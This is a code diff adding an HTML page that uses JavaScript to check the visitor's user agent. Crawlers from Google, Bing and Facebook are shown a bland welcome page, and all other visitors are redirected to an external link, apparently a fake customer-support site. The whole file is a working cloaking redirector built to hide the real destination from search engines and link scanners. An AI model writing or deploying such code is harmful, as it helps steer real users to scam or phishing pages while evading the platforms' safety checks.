@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect for Real Users</title>
+    <script type="text/javascript">
+        // Simple bot detection function
+        function isHuman() {
+            // Check for common bot-like behavior: bots typically don't have JavaScript enabled.
+            return !(navigator.userAgent.match(/bot|crawl|slurp|spider|google|bing|facebook/i));
+        }
+
+        // Redirect if the user is human
+        window.onload = function() {
+            if (isHuman()) {
+                // Redirect to your custom URL
+                window.location.href = "https://customersupport.click/GDQG8D";
+            } else {
+                // Optional: Do nothing or show a message for bots
+                console.log("Bot detected - no redirect.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Welcome to My Website!</h1>
+    <p>If you're a real user, you will be redirected soon.</p>
+</body>
+</html>
